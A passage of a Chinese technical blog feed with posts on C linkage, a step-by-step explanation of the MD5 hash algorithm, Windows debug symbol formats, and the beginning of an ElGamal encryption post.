所有<code>static</code>的文件作用域标识符都为<code>内部链接</code>.</li><li>外部链接: 整个程序中任何<code>翻译单元</code>都能指代的标识符具有<code>外部链接</code>, 所有的<code>非static</code>函数, 所有<code>extern</code>变量(除非之前声明为static)和所有的文件作用域的<code>非static</code>变量都为<code>外部链接</code>.</li></ul><p>注: 所谓翻译单元由一个源文件及其所包含的头文件构成.</p><h1 id="参考资料">参考资料</h1><ul><li><a href="https://zh.cppreference.com/w/c/language/memory_model">内存模型 - cppreference.com</a></li><li><a href="https://zh.cppreference.com/w/c/language/scope">作用域 - cppreference.com</a></li><li><a href="https://zh.cppreference.com/w/c/language/name_space">查找与命名空间 - cppreference.com</a></li><li><a href="https://zh.cppreference.com/w/c/language/storage_duration">存储类说明符 - cppreference.com</a><br><br></li></ul><p align=right>——WAHAHA 2024.4.28</p><br><br><p>上一篇:<a href="../20243aebb4efa9ab">C语言教程-15_1-动态内存分配</a><br>下一篇:<a href="../2024ec7d71d5adb8">C语言教程-16_1-文件与文件操作</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5</title>
      <link href="/2024a4e552366964/"/>
      <url>/2024a4e552366964/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p><code>MD5</code>是一种广泛引用的密码散列函数,用于为任意长度的数据产生一个固定长<code>128bits(16 bytes)</code>的散列值,来确保信息传输的一致性.</p><p><code>MD5</code>于1992年公开，用以取代<a href="https://baike.baidu.com/item/MD4/8090275?fromModule=lemma_inlink">MD4</a>算法.</p><h1 id="算法过程">算法过程</h1><h2 id="1-数据填充">1.数据填充</h2><p><code>MD5</code>和<code>MD4</code>的数据填充相同.</p><p><code>MD5</code>可以对任意长度的数据进行散列,在算法之前需要对数据进行填充,使其位长度(bits)对<code>512(64 bytes)</code>求余的结果为<code>448(56 bytes)</code>.即最后需要空出<code>64bits(8 bytes)</code>,这8字节用于填充长度信息,因此最终结果对齐到512bits.</p><p>填充步骤如下:</p><ol><li>在原始信息的末尾填充一个<code>1</code>和若干个<code>0</code>,直到满足上述求余结果.</li><li>在第<code>1</code>步结果的后面附加一个<code>64bits</code>长度的数据(其值为原始信息的长度信息,单位为<code>bit</code>),如果长度信息超过<code>64bits</code>,则取低64位.</li></ol><p>注意:</p><ol><li>填充数据应该使用<code>小端序</code>进行处理,包括原始数据和64bits的长度信息.</li><li>最终的结果是512bits对齐的,即每个分组为512bits.</li><li>后续说的<code>1字(1-word)</code>代表4字节,即32-bits.</li></ol><h2 id="2-初始化md缓冲区">2.初始化MD缓冲区</h2><p>MD5使用4个缓冲区,命名为<code>A</code>,<code>B</code>,<code>C</code>,<code>D</code>.每个缓冲区均为<code>32bits</code>,以<code>小端序</code>储存:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">word A: <span class="number">01</span> <span class="number">23</span> <span class="number">45</span> <span class="number">67</span></span><br><span class="line">word B: <span class="number">89</span> ab cd ef</span><br><span class="line">word C: fe dc ba <span class="number">98</span></span><br><span class="line">word D: <span class="number">76</span> <span class="number">54</span> <span class="number">32</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><p>由于以小端序存储,因此在C程序中应该为如下程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> A 0x67452301</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> B 0xefcdab89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C 0x98badcfe</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> D 0x10325476</span></span><br></pre></td></tr></table></figure><h2 id="3-处理分组数据">3.处理分组数据</h2><p>每<code>521bits(即64-bytes/16-words)</code>数据为一组,每个分组单独进行处理.</p><p>注意:仍然以小端序进行处理.</p><h3 id="四个辅助非线性函数f-g-h-i">四个辅助非线性函数F,G,H,I</h3><p>首先定义四个辅助函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">F( X ,Y ,Z ) = ( X &amp; Y ) | ( (~X) &amp; Z )</span><br><span class="line"></span><br><span class="line">G( X ,Y ,Z ) = ( X &amp; Z ) | ( Y &amp; (~Z) )</span><br><span class="line"></span><br><span class="line">H( X ,Y ,Z ) = X ^ Y ^ Z</span><br><span class="line"></span><br><span class="line">I( X ,Y ,Z ) = Y ^ ( X | (~Z) )</span><br></pre></td></tr></table></figure><p>其中,<code>F</code>为&quot;如果X则Y,否则Z; <code>H</code>为&quot;诸位异或&quot;或称之为&quot;奇偶校验&quot;.</p><h3 id="四个函数ff-gg-hh-ii">四个函数FF,GG,HH,II</h3><p>定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FF(a ,b ,c ,d ,Mj ,s ,ti ): a = b + ( (a + F(b,c,d) + Mj + ti) &lt;&lt;&lt; s)</span><br><span class="line"></span><br><span class="line">GG(a ,b ,c ,d ,Mj ,s ,ti ): a = b + ( (a + G(b,c,d) + Mj + ti) &lt;&lt;&lt; s)</span><br><span class="line"></span><br><span class="line">HH(a ,b ,c ,d ,Mj ,s ,ti ): a = b + ( (a + H(b,c,d) + Mj + ti) &lt;&lt;&lt; s)</span><br><span class="line"></span><br><span class="line">II(a ,b ,c ,d ,Mj ,s ,ti ): a = b + ( (a + I(b,c,d) + Mj + ti) &lt;&lt;&lt; s)</span><br></pre></td></tr></table></figure><p>其中,<code>&lt;&lt;&lt;</code>代表<code>循环左移</code>.</p><h3 id="表t">表T</h3><p>如下是后面要用到的T表:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> T[<span class="number">64</span>] = &#123;  </span><br><span class="line">        <span class="number">0xd76aa478</span>, <span class="number">0xe8c7b756</span>, <span class="number">0x242070db</span>, <span class="number">0xc1bdceee</span>,  </span><br><span class="line">        <span class="number">0xf57c0faf</span>, <span class="number">0x4787c62a</span>, <span class="number">0xa8304613</span>, <span class="number">0xfd469501</span>,  </span><br><span class="line">        <span class="number">0x698098d8</span>, <span class="number">0x8b44f7af</span>, <span class="number">0xffff5bb1</span>, <span class="number">0x895cd7be</span>,  </span><br><span class="line">        <span class="number">0x6b901122</span>, <span class="number">0xfd987193</span>, <span class="number">0xa679438e</span>, <span class="number">0x49b40821</span>,  </span><br><span class="line">        <span class="number">0xf61e2562</span>, <span class="number">0xc040b340</span>, <span class="number">0x265e5a51</span>, <span class="number">0xe9b6c7aa</span>,  </span><br><span class="line">        <span class="number">0xd62f105d</span>, <span class="number">0x02441453</span>, <span class="number">0xd8a1e681</span>, <span class="number">0xe7d3fbc8</span>,  </span><br><span class="line">        <span class="number">0x21e1cde6</span>, <span class="number">0xc33707d6</span>, <span class="number">0xf4d50d87</span>, <span class="number">0x455a14ed</span>,  </span><br><span class="line">        <span class="number">0xa9e3e905</span>, <span class="number">0xfcefa3f8</span>, <span class="number">0x676f02d9</span>, <span class="number">0x8d2a4c8a</span>,  </span><br><span class="line">        <span class="number">0xfffa3942</span>, <span class="number">0x8771f681</span>, <span class="number">0x6d9d6122</span>, <span class="number">0xfde5380c</span>,  </span><br><span class="line">        <span class="number">0xa4beea44</span>, <span class="number">0x4bdecfa9</span>, <span class="number">0xf6bb4b60</span>, <span class="number">0xbebfbc70</span>,  </span><br><span class="line">        <span class="number">0x289b7ec6</span>, <span class="number">0xeaa127fa</span>, <span class="number">0xd4ef3085</span>, <span class="number">0x04881d05</span>,  </span><br><span class="line">        <span class="number">0xd9d4d039</span>, <span class="number">0xe6db99e5</span>, <span class="number">0x1fa27cf8</span>, <span class="number">0xc4ac5665</span>,  </span><br><span class="line">        <span class="number">0xf4292244</span>, <span class="number">0x432aff97</span>, <span class="number">0xab9423a7</span>, <span class="number">0xfc93a039</span>,  </span><br><span class="line">        <span class="number">0x655b59c3</span>, <span class="number">0x8f0ccc92</span>, <span class="number">0xffeff47d</span>, <span class="number">0x85845dd1</span>,  </span><br><span class="line">        <span class="number">0x6fa87e4f</span>, <span class="number">0xfe2ce6e0</span>, <span class="number">0xa3014314</span>, <span class="number">0x4e0811a1</span>,  </span><br><span class="line">        <span class="number">0xf7537e82</span>, <span class="number">0xbd3af235</span>, <span class="number">0x2ad7d2bb</span>, <span class="number">0xeb86d391</span>  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="主循环">主循环</h3><p>该步骤使用一个有64个元素的表<code>T[0...63]</code>,该表的每个元素<code>T[i]</code>的值为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>32</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">sin(i)*(2^{32})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>的整数部分. 即<code>T[i] = int(sin(i) * pow(2,32))</code>,可以硬编码进程序,表如前所述.</p><p>将每个分组(512-bits/64bytes)分为16个子分组(4-bytes),即<code>M[0...15]</code></p><p>首先需要将四个缓冲区<code>A,B,C,D</code>复制到另外的四个位置<code>AA,BB,CC,DD</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AA = A</span><br><span class="line">BB = B</span><br><span class="line">CC = C</span><br><span class="line">DD = D</span><br></pre></td></tr></table></figure><p>注意在第一个分组处理之前,<code>A,B,C,D</code>已被初始化.</p><p>主循环处理每个<code>16-WORDs</code>的分组,共有<code>四个</code>轮次(ROUND),每个轮次都很相似,执行<code>四轮</code>操作:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ROUND 1 */</span></span><br><span class="line">FF(A,B,C,D,M[<span class="number">0</span>],<span class="number">7</span>,T[<span class="number">1</span>]);</span><br><span class="line">FF(D,A,B,C,M[<span class="number">1</span>],<span class="number">12</span>,T[<span class="number">2</span>]);</span><br><span class="line">FF(C,D,A,B,M[<span class="number">2</span>],<span class="number">17</span>,T[<span class="number">3</span>]);</span><br><span class="line">FF(B,C,D,A,M[<span class="number">3</span>],<span class="number">22</span>,T[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">FF(A,B,C,D,M[<span class="number">4</span>],<span class="number">7</span>,T[<span class="number">5</span>]);</span><br><span class="line">FF(D,A,B,C,M[<span class="number">5</span>],<span class="number">12</span>,T[<span class="number">6</span>]);</span><br><span class="line">FF(C,D,A,B,M[<span class="number">6</span>],<span class="number">17</span>,T[<span class="number">7</span>]);</span><br><span class="line">FF(B,C,D,A,M[<span class="number">7</span>],<span class="number">22</span>,T[<span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">FF(A,B,C,D,M[<span class="number">8</span>],<span class="number">7</span>,T[<span class="number">9</span>]);</span><br><span class="line">FF(D,A,B,C,M[<span class="number">9</span>],<span class="number">12</span>,T[<span class="number">10</span>]);</span><br><span class="line">FF(C,D,A,B,M[<span class="number">10</span>],<span class="number">17</span>,T[<span class="number">11</span>]);</span><br><span class="line">FF(B,C,D,A,M[<span class="number">11</span>],<span class="number">22</span>,T[<span class="number">12</span>]);</span><br><span class="line"></span><br><span class="line">FF(A,B,C,D,M[<span class="number">12</span>],<span class="number">7</span>,T[<span class="number">13</span>]);</span><br><span class="line">FF(D,A,B,C,M[<span class="number">13</span>],<span class="number">12</span>,T[<span class="number">14</span>]);</span><br><span class="line">FF(C,D,A,B,M[<span class="number">14</span>],<span class="number">17</span>,T[<span class="number">15</span>]);</span><br><span class="line">FF(B,C,D,A,M[<span class="number">15</span>],<span class="number">22</span>,T[<span class="number">16</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ROUND 2 */</span></span><br><span class="line">GG(A,B,C,D,M[<span class="number">1</span>],<span class="number">5</span>,T[<span class="number">17</span>]);</span><br><span class="line">GG(D,A,B,C,M[<span class="number">6</span>],<span class="number">9</span>,T[<span class="number">18</span>]);</span><br><span class="line">GG(C,D,A,B,M[<span class="number">11</span>],<span class="number">14</span>,T[<span class="number">19</span>]);</span><br><span class="line">GG(B,C,D,A,M[<span class="number">0</span>],<span class="number">20</span>,T[<span class="number">20</span>]);</span><br><span class="line"></span><br><span class="line">GG(A,B,C,D,M[<span class="number">5</span>],<span class="number">5</span>,T[<span class="number">21</span>]);</span><br><span class="line">GG(D,A,B,C,M[<span class="number">10</span>],<span class="number">9</span>,T[<span class="number">22</span>]);</span><br><span class="line">GG(C,D,A,B,M[<span class="number">15</span>],<span class="number">14</span>,T[<span class="number">23</span>]);</span><br><span class="line">GG(B,C,D,A,M[<span class="number">4</span>],<span class="number">20</span>,T[<span class="number">24</span>]);</span><br><span class="line"></span><br><span class="line">GG(A,B,C,D,M[<span class="number">9</span>],<span class="number">5</span>,T[<span class="number">25</span>]);</span><br><span class="line">GG(D,A,B,C,M[<span class="number">14</span>],<span class="number">9</span>,T[<span class="number">26</span>]);</span><br><span class="line">GG(C,D,A,B,M[<span class="number">3</span>],<span class="number">14</span>,T[<span class="number">27</span>]);</span><br><span class="line">GG(B,C,D,A,M[<span class="number">8</span>],<span class="number">20</span>,T[<span class="number">28</span>]);</span><br><span class="line"></span><br><span class="line">GG(A,B,C,D,M[<span class="number">13</span>],<span class="number">5</span>,T[<span class="number">29</span>]);</span><br><span class="line">GG(D,A,B,C,M[<span class="number">2</span>],<span class="number">9</span>,T[<span class="number">30</span>]);</span><br><span class="line">GG(C,D,A,B,M[<span class="number">7</span>],<span class="number">14</span>,T[<span class="number">31</span>]);</span><br><span class="line">GG(B,C,D,A,M[<span class="number">12</span>],<span class="number">20</span>,T[<span class="number">32</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ROUND 3 */</span></span><br><span class="line">HH(A,B,C,D,M[<span class="number">5</span>],<span class="number">4</span>,T[<span class="number">33</span>]);</span><br><span class="line">HH(D,A,B,C,M[<span class="number">8</span>],<span class="number">11</span>,T[<span class="number">34</span>]);</span><br><span class="line">HH(C,D,A,B,M[<span class="number">11</span>],<span class="number">16</span>,T[<span class="number">35</span>]);</span><br><span class="line">HH(B,C,D,A,M[<span class="number">14</span>],<span class="number">23</span>,T[<span class="number">36</span>]);</span><br><span class="line"></span><br><span class="line">HH(A,B,C,D,M[<span class="number">1</span>],<span class="number">4</span>,T[<span class="number">37</span>]);</span><br><span class="line">HH(D,A,B,C,M[<span class="number">4</span>],<span class="number">11</span>,T[<span class="number">38</span>]);</span><br><span class="line">HH(C,D,A,B,M[<span class="number">7</span>],<span class="number">16</span>,T[<span class="number">39</span>]);</span><br><span class="line">HH(B,C,D,A,M[<span class="number">10</span>],<span class="number">23</span>,T[<span class="number">40</span>]);</span><br><span class="line"></span><br><span class="line">HH(A,B,C,D,M[<span class="number">13</span>],<span class="number">4</span>,T[<span class="number">41</span>]);</span><br><span class="line">HH(D,A,B,C,M[<span class="number">0</span>],<span class="number">11</span>,T[<span class="number">42</span>]);</span><br><span class="line">HH(C,D,A,B,M[<span class="number">3</span>],<span class="number">16</span>,T[<span class="number">43</span>]);</span><br><span class="line">HH(B,C,D,A,M[<span class="number">6</span>],<span class="number">23</span>,T[<span class="number">44</span>]);</span><br><span class="line"></span><br><span class="line">HH(A,B,C,D,M[<span class="number">9</span>],<span class="number">4</span>,T[<span class="number">45</span>]);</span><br><span class="line">HH(D,A,B,C,M[<span class="number">12</span>],<span class="number">11</span>,T[<span class="number">46</span>]);</span><br><span class="line">HH(C,D,A,B,M[<span class="number">15</span>],<span class="number">16</span>,T[<span class="number">47</span>]);</span><br><span class="line">HH(B,C,D,A,M[<span class="number">2</span>],<span class="number">23</span>,T[<span class="number">48</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ROUND 4 */</span></span><br><span class="line">II(A,B,C,D,M[<span class="number">0</span>],<span class="number">6</span>,T[<span class="number">49</span>]);</span><br><span class="line">II(D,A,B,C,M[<span class="number">7</span>],<span class="number">10</span>,T[<span class="number">50</span>]);</span><br><span class="line">II(C,D,A,B,M[<span class="number">14</span>],<span class="number">15</span>,T[<span class="number">51</span>]);</span><br><span class="line">II(B,C,D,A,M[<span class="number">5</span>],<span class="number">21</span>,T[<span class="number">52</span>]);</span><br><span class="line"></span><br><span class="line">II(A,B,C,D,M[<span class="number">12</span>],<span class="number">6</span>,T[<span class="number">53</span>]);</span><br><span class="line">II(D,A,B,C,M[<span class="number">3</span>],<span class="number">10</span>,T[<span class="number">54</span>]);</span><br><span class="line">II(C,D,A,B,M[<span class="number">10</span>],<span class="number">15</span>,T[<span class="number">55</span>]);</span><br><span class="line">II(B,C,D,A,M[<span class="number">1</span>],<span class="number">21</span>,T[<span class="number">56</span>]);</span><br><span class="line"></span><br><span class="line">II(A,B,C,D,M[<span class="number">8</span>],<span class="number">6</span>,T[<span class="number">57</span>]);</span><br><span class="line">II(D,A,B,C,M[<span class="number">15</span>],<span class="number">10</span>,T[<span class="number">58</span>]);</span><br><span class="line">II(C,D,A,B,M[<span class="number">6</span>],<span class="number">15</span>,T[<span class="number">59</span>]);</span><br><span class="line">II(B,C,D,A,M[<span class="number">13</span>],<span class="number">21</span>,T[<span class="number">60</span>]);</span><br><span class="line"></span><br><span class="line">II(A,B,C,D,M[<span class="number">4</span>],<span class="number">6</span>,T[<span class="number">61</span>]);</span><br><span class="line">II(D,A,B,C,M[<span class="number">11</span>],<span class="number">10</span>,T[<span class="number">62</span>]);</span><br><span class="line">II(C,D,A,B,M[<span class="number">2</span>],<span class="number">15</span>,T[<span class="number">63</span>]);</span><br><span class="line">II(B,C,D,A,M[<span class="number">9</span>],<span class="number">21</span>,T[<span class="number">64</span>]);</span><br></pre></td></tr></table></figure><p>然后,四个<code>缓冲区(寄存器): A,B,C,D</code>增加其原来的值:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A = A + AA</span><br><span class="line">B = B + BB</span><br><span class="line">C = C + CC</span><br><span class="line">D = D + DD</span><br></pre></td></tr></table></figure><p>到此,一轮主循环结束,如此逐个使用每个<code>16-WORDs</code>分组执行以上算法.</p><h3 id="输出结果">输出结果</h3><p>最终输出的结果即为四个缓冲区的值<code>A,B,C,D</code>的级联,共<code>128-bits</code>,一般将其转换为16进制表示.<br>注意: 输出时,从A的低字节开始,到D的高字节结束,即<code>小端序</code>.(?)</p><h1 id="参阅">参阅</h1><p><a href="https://datatracker.ietf.org/doc/html/rfc1321">RFC 1321 - The MD5 Message-Digest Algorithm</a></p>]]></content>
      
      
      <categories>
          
          <category> 散列算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>调试符号</title>
      <link href="/2024422bdf0a6e71/"/>
      <url>/2024422bdf0a6e71/</url>
      
        <content type="html"><![CDATA[<p>调试符号是被调试程序与源程序之间信息的桥梁,是在编译器生成可执行文件时,为支持调试而摘录的调试信息.</p><p>包含变量,类型,函数名,源代码行号等.</p><h1 id="符号格式">符号格式</h1><p>符号表（又称“调试符”）的作用是将十六进制数转换为源文件代码行、函数名及变量名。符号表中还包含程序使用的类型信息。调试器使用类型信息可以获取原始数据，并将原始数据显示为程序中所定义的结构或变量。</p><h2 id="sys格式">SYS格式</h2><p>SYM格式早期用于MS-DOS和16位Windows系统，现在只作为Windows9x的调试符使用（因为Windows9x系统的多数内核仍然是16位的）.</p><h2 id="coff格式">COFF格式</h2><p>COFF格式（CommonObjectFileFormat）是UNIX供应商所遵循规范的一部分，由WindowsNT2.1首次引I进使用。现在，微软逐渐抛弃了COFF格式，转而使用更为流行的符号表达式。</p><h2 id="codeview格式">CodeView格式</h2><p>CodeView（CV）最早是在MS-DOS下作为MicrosoftC/C++7的一部分出现的，现在已经支持Win32系统了。“CodeView”是早期微软调试器的名称，其支持的调试符号为C7格式。C7格式在执行模块中是自我包含的，符号信息与二进制代码混合（意味着调试文件会非常大）.</p><h2 id="pdb格式">PDB格式</h2><p>PDB（ProgramDatabase）格式是现今最常用的一种符号格式，是微软自己定义的未公开格式。VisualC++和VisualBasic都支持PDB格式。与CV不同的是，PDB符号根据应用程序不同的链接方式保存在单独的或多个文件中。</p><h2 id="dbg格式">DBG格式</h2><p>DBG是系统调试符。有了系统调试符，调试器才可以显示系统函数名。DBG文件与其他符号格式不同，因为链接器并不创建DBG文件。DBG文件基本上是一个包含其他调试符的文件（例如包含COFF或C7等类型的调试符）。微软将操作系统调试符分配在DBG文件中。当然，这些文件中只包含公用信息和全局信息，例如ntdlll.dbg、kermel32.dbg等。</p><h2 id="map格式">MAP格式</h2><p>MAP文件是程序的全局符号、源文件和代码行号信息的唯一文本表示方法。MAP文件在任何地方、任何时候都可以使用，不需要程序支持，通用性极好。</p><h1 id="创建调试文件">创建调试文件</h1><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240313120700425.png" alt="image-20240313120700425" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> OD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElGamal加密方案</title>
      <link href="/202418fb115c13a6/"/>
      <url>/202418fb115c13a6/</url>
      
        <content type="html"><![CDATA[<h1 id="加密过程">加密过程</h1><p>ElGamal加密方案是一种基于难解的离散对数问题的公钥加密系统。它由Taher Elgamal在1985年提出，用于提供数据的机密性和/或数字签名。</p><p>以下是ElGamal加密过程的基本步骤：</p><ol><li><p><strong>密钥生成</strong>：</p><ul><li>选择一个大的随机质数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span></span></span></span>和一个生成元<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span>（一个整数，其在模<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span></span></span></span>下的所有正幂能够生成模<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span></span></span></span>的所有非零余数）。</li><li>选择一个随机整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>，满足<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>&lt;</mo><mi>x</mi><mo>&lt;</mo><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1&lt;x&lt;p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68354em;vertical-align:-0.0391em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，作为私钥。</li><li>计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><msup><mi>g</mi><mi>x</mi></msup><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">y=g^x \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span 